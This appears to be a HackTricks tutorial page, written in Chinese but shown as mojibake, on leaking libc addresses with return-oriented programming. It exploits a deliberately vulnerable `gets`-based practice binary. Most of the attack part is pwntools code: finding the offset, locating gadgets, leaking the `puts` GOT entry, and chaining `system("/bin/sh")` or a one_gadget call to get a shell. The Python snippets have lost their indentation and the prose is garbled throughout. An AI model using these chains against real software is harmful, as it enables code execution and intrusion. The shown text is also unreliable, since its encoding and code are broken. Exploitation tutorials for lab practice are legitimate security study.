# ä½¿ç”¨ROPæ³„æ¼libcåœ°å€

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS Family**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ä»¬ ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## å¿«é€Ÿæ€»ç»“

1. **æ‰¾åˆ°**æº¢å‡º**çš„åç§»é‡**
2. **æ‰¾åˆ°** `POP_RDI` æœºå…³ã€`PUTS_PLT` å’Œ `MAIN` æœºå…³
3. ä½¿ç”¨å‰è¿°æœºå…³**æ³„æ¼putsæˆ–å…¶ä»–libcå‡½æ•°çš„å†…å­˜åœ°å€**å¹¶**æ‰¾åˆ°libcç‰ˆæœ¬**ï¼ˆ[ä¸‹è½½åœ°å€](https://libc.blukat.me)ï¼‰
4. åˆ©ç”¨åº“ï¼Œ**è®¡ç®—ROPå¹¶åˆ©ç”¨å®ƒ**

## å…¶ä»–æ•™ç¨‹å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ä»¥ä¾›ç»ƒä¹ 

æœ¬æ•™ç¨‹å°†åˆ©ç”¨æ­¤æ•™ç¨‹ä¸­æå‡ºçš„ä»£ç /äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåˆ©ç”¨ï¼š[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
å…¶ä»–æœ‰ç”¨çš„æ•™ç¨‹ï¼š[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)ï¼Œ[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## ä»£ç 

æ–‡ä»¶åï¼š`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - æ³„éœ² LIBC æ¨¡æ¿

ä¸‹è½½ exploit å¹¶å°†å…¶æ”¾ç½®åœ¨æ˜“å—æ”»å‡»çš„äºŒè¿›åˆ¶æ–‡ä»¶ç›¸åŒçš„ç›®å½•ä¸­ï¼Œå¹¶å‘è„šæœ¬æä¾›æ‰€éœ€çš„æ•°æ®ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- æŸ¥æ‰¾åç§»é‡

åœ¨ç»§ç»­åˆ©ç”¨ä¹‹å‰ï¼Œæ¨¡æ¿éœ€è¦ä¸€ä¸ªåç§»é‡ã€‚å¦‚æœæœªæä¾›ä»»ä½•åç§»é‡ï¼Œå®ƒå°†æ‰§è¡Œå¿…è¦çš„ä»£ç æ¥æŸ¥æ‰¾å®ƒï¼ˆé»˜è®¤ä¸º `OFFSET = ""`ï¼‰:
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**æ‰§è¡Œ** `python template.py` ä¼šæ‰“å¼€ä¸€ä¸ª GDB æ§åˆ¶å°ï¼Œç¨‹åºä¼šå´©æºƒã€‚åœ¨è¯¥ **GDB æ§åˆ¶å°** ä¸­æ‰§è¡Œ `x/wx $rsp` ä»¥è·å–å°†è¦è¦†ç›– RIP çš„ **å­—èŠ‚**ã€‚æœ€ååœ¨ **python** æ§åˆ¶å°ä¸­è·å– **åç§»é‡**ï¼š
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1004).png>)

åœ¨æ‰¾åˆ°åç§»é‡ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º40ï¼‰åï¼Œä½¿ç”¨è¯¥å€¼æ›´æ”¹æ¨¡æ¿ä¸­çš„OFFSETå˜é‡ã€‚\
`OFFSET = "A" * 40`

å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ï¼š`pattern create 1000` -- _æ‰§è¡Œç›´åˆ°ret_ -- ä» GEF ä¸­æ‰§è¡Œ `pattern seach $rsp`ã€‚

## 2- æŸ¥æ‰¾Gadgets

ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°ROP gadgetsã€‚è¿™äº›ROP gadgetså°†æœ‰åŠ©äºè°ƒç”¨`puts`æ¥æŸ¥æ‰¾æ­£åœ¨ä½¿ç”¨çš„**libc**ï¼Œå¹¶ç¨å**å¯åŠ¨æœ€ç»ˆçš„æ”»å‡»**ã€‚
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` ç”¨äºè°ƒç”¨ **puts å‡½æ•°**ã€‚\
`MAIN_PLT` ç”¨äºåœ¨ä¸€æ¬¡äº¤äº’åå†æ¬¡è°ƒç”¨ **ä¸»å‡½æ•°** ä»¥ä¾¿å†æ¬¡ **åˆ©ç”¨** æº¢å‡ºï¼ˆæ— é™æ¬¡åˆ©ç”¨ï¼‰ã€‚**å®ƒç”¨äºåœ¨æ¯ä¸ª ROP ç»“å°¾å¤„å†æ¬¡è°ƒç”¨ç¨‹åº**ã€‚\
**POP\_RDI** ç”¨äºå‘è¢«è°ƒç”¨å‡½æ•° **ä¼ é€’** å‚æ•°ã€‚

åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œæ‚¨æ— éœ€æ‰§è¡Œä»»ä½•æ“ä½œï¼Œå› ä¸ºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ pwntools å°†æ‰¾åˆ°ä¸€åˆ‡ã€‚

## 3- æŸ¥æ‰¾ libc åº“

ç°åœ¨æ˜¯æ—¶å€™æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨çš„ **libc** åº“çš„ç‰ˆæœ¬ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°† **æ³„æ¼** **å†…å­˜ä¸­ puts å‡½æ•°** çš„ **åœ°å€**ï¼Œç„¶åæˆ‘ä»¬å°† **æœç´¢** puts ç‰ˆæœ¬æ‰€åœ¨çš„åº“ç‰ˆæœ¬ã€‚
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ‰§è¡Œçš„ä»£ç ä¸­æœ€é‡è¦çš„ä¸€è¡Œæ˜¯ï¼š
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
è¿™å°†å‘é€ä¸€äº›å­—èŠ‚ï¼Œç›´åˆ°**è¦†ç›–** **RIP** å¯èƒ½ä¸ºæ­¢ï¼š`OFFSET`ã€‚\
ç„¶åï¼Œå®ƒå°†è®¾ç½®**gadget** `POP_RDI`çš„**åœ°å€**ï¼Œä»¥ä¾¿ä¸‹ä¸€ä¸ªåœ°å€ï¼ˆ`FUNC_GOT`ï¼‰å°†è¢«ä¿å­˜åœ¨**RDI**å¯„å­˜å™¨ä¸­ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬æƒ³è¦**è°ƒç”¨ puts** å¹¶å°†`PUTS_GOT`çš„**åœ°å€**ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒï¼Œå› ä¸ºå†…å­˜ä¸­ puts å‡½æ•°çš„åœ°å€ä¿å­˜åœ¨`PUTS_GOT`æŒ‡å‘çš„åœ°å€ä¸­ã€‚\
ä¹‹åï¼Œå°†è°ƒç”¨`PUTS_PLT`ï¼ˆå¸¦æœ‰`PUTS_GOT`åœ¨**RDI**ä¸­ï¼‰ï¼Œå› æ­¤ puts å°†**è¯»å–**`PUTS_GOT`ä¸­çš„å†…å®¹ï¼ˆ**å†…å­˜ä¸­ puts å‡½æ•°çš„åœ°å€**ï¼‰å¹¶å°†å…¶**æ‰“å°å‡ºæ¥**ã€‚\
æœ€åï¼Œ**å†æ¬¡è°ƒç”¨ main å‡½æ•°**ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥å†æ¬¡åˆ©ç”¨æº¢å‡ºã€‚

è¿™æ ·ï¼Œæˆ‘ä»¬å·²ç»**æ¬ºéª— puts å‡½æ•°**å°†**æ‰“å°**å‡º**puts**å‡½æ•°çš„**å†…å­˜ä¸­çš„åœ°å€**ï¼ˆä½äº**libc**åº“ä¸­ï¼‰ã€‚ç°åœ¨æˆ‘ä»¬æœ‰äº†è¯¥åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥**æŸ¥æ‰¾æ­£åœ¨ä½¿ç”¨çš„ libc ç‰ˆæœ¬**ã€‚

![](<../../../../.gitbook/assets/image (1046).png>)

ç”±äºæˆ‘ä»¬æ­£åœ¨**åˆ©ç”¨**ä¸€äº›**æœ¬åœ°**äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ**ä¸éœ€è¦**å¼„æ¸…æ¥šæ­£åœ¨ä½¿ç”¨çš„**libc**ç‰ˆæœ¬ï¼ˆåªéœ€åœ¨`/lib/x86_64-linux-gnu/libc.so.6`ä¸­æ‰¾åˆ°è¯¥åº“ï¼‰ã€‚\
ä½†æ˜¯ï¼Œåœ¨è¿œç¨‹åˆ©ç”¨æ¡ˆä¾‹ä¸­ï¼Œæˆ‘å°†åœ¨è¿™é‡Œè§£é‡Šå¦‚ä½•æ‰¾åˆ°å®ƒï¼š

### 3.1- æœç´¢ libc ç‰ˆæœ¬ï¼ˆ1ï¼‰

æ‚¨å¯ä»¥åœ¨ç½‘é¡µä¸Šæœç´¢æ­£åœ¨ä½¿ç”¨çš„åº“ï¼š[https://libc.blukat.me/](https://libc.blukat.me)\
å®ƒè¿˜å°†å…è®¸æ‚¨ä¸‹è½½å‘ç°çš„**libc**ç‰ˆæœ¬

![](<../../../../.gitbook/assets/image (218).png>)

### 3.2- æœç´¢ libc ç‰ˆæœ¬ï¼ˆ2ï¼‰

æ‚¨ä¹Ÿå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

è¿™å°†éœ€è¦ä¸€äº›æ—¶é—´ï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚\
ä¸ºäº†ä½¿å…¶å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦ï¼š

* Libc ç¬¦å·åç§°ï¼š`puts`
* æ³„æ¼çš„ libc åœ°å€ï¼š`0x7ff629878690`

æˆ‘ä»¬å¯ä»¥æ‰¾å‡ºæœ€æœ‰å¯èƒ½ä½¿ç”¨çš„**libc**ã€‚
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
æˆ‘ä»¬å¾—åˆ°2ä¸ªåŒ¹é…é¡¹ï¼ˆå¦‚æœç¬¬ä¸€ä¸ªä¸èµ·ä½œç”¨ï¼Œæ‚¨åº”è¯¥å°è¯•ç¬¬äºŒä¸ªï¼‰ã€‚ä¸‹è½½ç¬¬ä¸€ä¸ªï¼š
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
### 3.3- æ³„æ¼çš„å…¶ä»–å‡½æ•°

å°†`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so`ä¸­çš„libcå¤åˆ¶åˆ°æˆ‘ä»¬çš„å·¥ä½œç›®å½•ã€‚
```python
puts
printf
__libc_start_main
read
gets
```
## 4- å¯»æ‰¾åŸºäºlibcçš„åœ°å€å¹¶åˆ©ç”¨

åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘ä»¬åº”è¯¥çŸ¥é“ä½¿ç”¨çš„libcåº“ã€‚ç”±äºæˆ‘ä»¬æ­£åœ¨åˆ©ç”¨ä¸€ä¸ªæœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘å°†ä»…ä½¿ç”¨:`/lib/x86_64-linux-gnu/libc.so.6`

å› æ­¤ï¼Œåœ¨`template.py`çš„å¼€å¤´å°†**libc**å˜é‡æ›´æ”¹ä¸ºï¼š`libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

ç»™å‡º**libcåº“**çš„**è·¯å¾„**ï¼Œå…¶ä½™çš„**åˆ©ç”¨å°†è‡ªåŠ¨è®¡ç®—**ã€‚

åœ¨`get_addr`å‡½æ•°å†…ï¼Œå°†è®¡ç®—**libcçš„åŸºåœ°å€**ï¼š
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œ**æœ€ç»ˆçš„libcåŸºå€å¿…é¡»ä»¥00ç»“å°¾**ã€‚å¦‚æœä¸æ˜¯è¿™ç§æƒ…å†µï¼Œæ‚¨å¯èƒ½å·²ç»æ³„æ¼äº†ä¸€ä¸ªä¸æ­£ç¡®çš„åº“ã€‚
{% endhint %}

ç„¶åï¼Œå‡½æ•°`system`çš„åœ°å€å’Œå­—ç¬¦ä¸²_"/bin/sh"_çš„**åœ°å€**å°†ä»**libcçš„åŸºåœ°å€**ä¸­**è®¡ç®—**å‡ºæ¥ï¼Œå¹¶ç»™å‡º**libcåº“**ã€‚
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
æœ€åï¼Œå°†å‡†å¤‡å‘é€/bin/shæ‰§è¡Œåˆ©ç”¨ç¨‹åºï¼š
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
è®©æˆ‘ä»¬è§£é‡Šè¿™ä¸ªæœ€ç»ˆçš„ROPã€‚\
æœ€åä¸€ä¸ªROP (`rop1`) ç»“æŸæ—¶å†æ¬¡è°ƒç”¨äº† main å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å†æ¬¡åˆ©ç”¨**æº¢å‡º**ï¼ˆè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ `OFFSET` å†æ¬¡å‡ºç°åœ¨è¿™é‡Œï¼‰ã€‚ç„¶åï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨ `POP_RDI` æŒ‡å‘ _"/bin/sh"_ çš„**åœ°å€**ï¼ˆ`BINSH`ï¼‰ï¼Œå¹¶è°ƒç”¨ **system** å‡½æ•°ï¼ˆ`SYSTEM`ï¼‰ï¼Œå› ä¸º _"/bin/sh"_ çš„åœ°å€å°†ä½œä¸ºå‚æ•°ä¼ é€’ã€‚\
æœ€åï¼Œ**è°ƒç”¨ exit å‡½æ•°çš„åœ°å€**ï¼Œä»¥ä¾¿è¿›ç¨‹**æ­£å¸¸é€€å‡º**ï¼Œä¸ä¼šç”Ÿæˆä»»ä½•è­¦æŠ¥ã€‚

**è¿™æ ·ï¼Œåˆ©ç”¨ç¨‹åºå°†æ‰§è¡Œä¸€ä¸ª \_/bin/sh**\_\*\* shellã€‚\*\*

![](<../../../../.gitbook/assets/image (162).png>)

## 4(2)- ä½¿ç”¨ ONE\_GADGET

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)æ¥è·å–ä¸€ä¸ª shellï¼Œè€Œä¸æ˜¯ä½¿ç”¨ **system** å’Œ **"/bin/sh"**ã€‚**ONE\_GADGET** å°†åœ¨ libc åº“ä¸­æ‰¾åˆ°ä¸€ç§æ–¹æ³•ï¼Œåªéœ€ä¸€ä¸ª **ROP åœ°å€**å³å¯è·å–ä¸€ä¸ª shellã€‚\
ç„¶è€Œï¼Œé€šå¸¸ä¼šæœ‰ä¸€äº›çº¦æŸæ¡ä»¶ï¼Œæœ€å¸¸è§ä¸”æ˜“äºé¿å…çš„æ˜¯ `[rsp+0x30] == NULL`ã€‚ç”±äºæ‚¨å¯ä»¥æ§åˆ¶ **RSP** ä¸­çš„å€¼ï¼Œå› æ­¤åªéœ€å‘é€ä¸€äº›é¢å¤–çš„ NULL å€¼ï¼Œå°±å¯ä»¥é¿å…è¿™ä¸ªçº¦æŸæ¡ä»¶ã€‚

![](<../../../../.gitbook/assets/image (751).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°åˆ©ç”¨æ­¤æ¼æ´çš„æ¨¡æ¿ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## å¸¸è§é—®é¢˜

### MAIN\_PLT = elf.symbols\['main'] æœªæ‰¾åˆ°

å¦‚æœæ‰¾ä¸åˆ°"main"ç¬¦å·ã€‚é‚£ä¹ˆæ‚¨å¯ä»¥æ‰¾åˆ°ä¸»ä»£ç æ‰€åœ¨çš„ä½ç½®ï¼š
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
å¹¶æ‰‹åŠ¨è®¾ç½®åœ°å€ï¼š
```python
MAIN_PLT = 0x401080
```
### Putsæœªæ‰¾åˆ°

å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰ä½¿ç”¨Putsï¼Œæ‚¨åº”è¯¥æ£€æŸ¥æ˜¯å¦ä½¿ç”¨äº†

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

å¦‚æœåœ¨åˆ›å»ºæ‰€æœ‰åˆ©ç”¨åå‘ç°è¿™ä¸ª**é”™è¯¯**ï¼š`sh: 1: %s%s%s%s%s%s%s%s: not found`

å°è¯•**ä»"/bin/sh"çš„åœ°å€ä¸­å‡å»64ä¸ªå­—èŠ‚**ï¼š
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
